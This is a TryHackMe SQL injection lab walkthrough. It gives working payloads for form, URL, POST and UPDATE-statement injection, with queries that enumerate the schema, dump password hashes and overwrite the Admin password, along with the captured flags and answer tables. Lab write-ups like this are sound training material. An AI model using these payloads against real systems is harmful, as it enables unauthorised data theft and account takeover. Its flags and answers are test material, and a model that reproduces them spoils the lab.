# Technical Documentation: TryHackMe — SQL Injection Lab Walkthrough
## SQL Injection Lab (Module 1)
Executive Summary
This document details the exploitation methodologies, parameters, and flags retrieved during the completion of Module 1: In-Band (Classic) SQL Injection on TryHackMe.

Exploitation Breakdown
Lab 1: Input Box Non-String (```/sesqli1/home```)
- Vulnerability Analysis: The application accepts integer input for the ```profileID``` parameter without sanitization or string wrapping inside the SQL query.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 or 1=1--
```
(Captured from)
- Exploit Payload: ```1 or 1=1--```
- Retrieved Flag: ```THM{dccea429d73d4a6b4f117ac64724f460}```

Lab 2: Input Box String (```/sesqli2/login```)
- Vulnerability Analysis: User input is embedded within single quotes inside the SQL query. Injecting a single quote breaks the string context, enabling boolean manipulation and query truncation via comments.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' or 1=1--' AND password='a'
```
(Captured from)
- Exploit Payload: ```1' or 1=1--```
- Retrieved Flag: ```THM{356e9de6016b9ac34e02df99a5f755ba}```

Lab 3: URL Injection (```/sesqli3/login```)
- Vulnerability Analysis: Parameters supplied directly via URL query strings are concatenated into the SQL statement without proper escaping or prepared statements.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' or 1=1--' AND password='a'
```
(Captured from)
- Exploit Payload (URL):
```plaintext
http://10.48.174.24:5000/sesqli3/login?profileID=1' or 1=1--&password=a
```
(Captured from)
- Retrieved Flag: ```THM{645eab5d34f81981f5705de54e8a9c36}```

Lab 4: POST Request Body Injection (```/sesqli4/login```)
- Vulnerability Analysis: Parameters transmitted in the HTTP POST body (```application/x-www-form-urlencoded```) are vulnerable to injection. Intercepting and modifying the POST body bypasses client-side controls.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1'or 1=1--' AND password='a'
```
(Captured from)
- Intercepted HTTP POST Body:
```HTTP
POST /sesqli4/login HTTP/1.1
Host: 10.48.174.24:5000
Content-Type: application/x-www-form-urlencoded

profileID=1'or 1=1--&password=a
```
(Captured from)
- Retrieved Flag: ```THM{727334fd0f0ea1b836a8d443f09dc8eb}```

Summary Table: Module 1 Answers
| Challenge Name                         | Injection Point,Payload           | Flag                                   |
|:--                                     |:--                                |:--                                     |
| SQL Injection 1: Input Box Non-String  | Form Input (Integer),1 or 1=1--   | THM{dccea429d73d4a6b4f117ac64724f460}  |
| SQL Injection 2: Input Box String      | Form Input (String),1' or 1=1--   | THM{356e9de6016b9ac34e02df99a5f755ba}  | 
| SQL Injection 3: URL Injection         | URL GET Parameter,1' or 1=1--     | THM{645eab5d34f81981f5705de54e8a9c36}  |
| SQL Injection 4: POST Injection        | HTTP POST Body,1'or 1=1--         | THM{727334fd0f0ea1b836a8d443f09dc8eb}  | 

## SQL Injection Lab (Module 2)
Executive Summary
This document details the complete enumeration, exploitation methodology, subquery construction, and flag retrieval for Task 3: Introduction to SQL Injection: Part 2 (SQL Injection 5: UPDATE Statement) on TryHackMe.

Target & Vulnerability Overview
- Target URL: ```[http://10.48.174.24:5000/sesqli5/](http://10.48.174.24:5000/sesqli5/)```
- Initial Credentials: ```profileID: 10``` | ```password: toor```
- Vulnerability Class: In-Band SQL Injection in HTTP POST parameters processed within an ```UPDATE``` statement.
- Impact: Overwriting arbitrary user records (e.g., password resets), enumerating metadata tables, schema exfiltration, and out-of-table data extraction.

Exploitation & Enumeration Methodology
1. Input Sanitization Bypass & Syntax Verification
Inspecting the profile modification endpoint (```/sesqli5/profile```) reveals three input fields: ```nickName```, ```email```, and ```password```. Injecting a comma-separated column reassignment breaks out of the expected input logic:
- Payload
```plaintext
asd',nickName='test',email='hacked
```
- Back-end Query Executed:
```sql
UPDATE usertable SET nickName='test',email='hackeasd',nickName='test',email='hackedd' WHERE UID='1'
```
(Result: Both fields update dynamically, confirming SQL injection in the UPDATE statement context.)

2. Environment & Version Fingerprinting
To determine the back-end database, system functions were evaluated inside subqueries:
- Payload:
```sql
',nickName=sqlite_version(),email='
```
- Result: ```3.27.2```
- DBMS Identified: SQLite

3. Database Schema Enumeration
Table Enumeration:
- Payload:
```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%'),email='
```
- Extracted Tables: usertable, secrets
Schema Extraction (usertable):
- Payload:
```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```
- Structure:
```sql
CREATE TABLE usertable (
    UID integer primary key, 
    name varchar(30) NOT NULL, 
    profileID varchar(20) DEFAULT NULL, 
    salary int(9) DEFAULT NULL, 
    passportNr varchar(20) DEFAULT NULL, 
    email varchar(300) DEFAULT NULL, 
    nickName varchar(300) DEFAULT NULL, 
    password varchar(300) DEFAULT NULL
)
```
Schema Extraction (secrets):
- Payload:
```sql
CREATE TABLE secrets (
    id integer primary key, 
    author integer not null, 
    secret text not null
)
```
4. Data Exfiltration (usertable) & Password Modification
Exfiltrating Credentials:
- Payload:
```sql
',nickName=(SELECT group_concat(profileID || "." || name || "." || password) FROM usertable),email='
```
- Dumping Results:
  - ```10,Francois,ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a```
  - ```11,Michandre,05842ffb6dc90bef3543dd85ee50dd302f3d1f163de1a76eee073ee97d851937```
  - ```12,Colett,c69d171e761fe56711e908515def631856c665dc234a0aa404b32c73bdbc81ac```
  - ```13,Phillip,b6efdfb0e20a34908c092725db15ae0c3666b3cea558fa74e0667bd91a10a0d3```
  - ```14,Ivan,be042a70c99d1c438cdbd479b955e4fba33faf4f8c494239257e4248bbcf4ff```
  - ```99,Admin,6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25```

Privilege Escalation / Password Overwrite Payload:
- SHA-256 Hash Generation: ```Password123``` -> ```088c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601```
- Payload:
```sql
',password='088c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'--
```
5. Out-of-Table Data Exfiltration (secrets) & Flag Capture
- Payload:
```sql
',nickName=(SELECT group_concat(id || "," || author || "," || secret) FROM secrets),email='
```
- Back-end Query Executed:
```sql
UPDATE usertable SET nickName='',email='',nickName=(SELECT group_concat(id || "," || author || "," || secret) FROM secrets),email='' WHERE UID='1'
```
- Exfiltrated String:
```1,1,Lorem ipsum... | 2,3,Donec viverra... | 3,1,Aliquam vestibulum... |```
```4,5,Etiam feugiat... | 5,6,THM{b3a540515dbd9847c29cffa1bef1edfb}```

Summary Table: Module 2 Findings
| Parameter / Entity    | Target / Value                            |
|:--                    |:--                                        |
| Vulnerable Function   | HTTP POST Edit Profile (/sesqli5/profile) | 
| DBMS Engine           | SQLite 3.27.2                             | 
| Enumerated Tables     | "usertable, secrets"                      | 
| Target Field          | secrets.secret                            | 
| Module 2 Flag         | THM{b3a540515dbd9847c29cffa1bef1edfb}     |

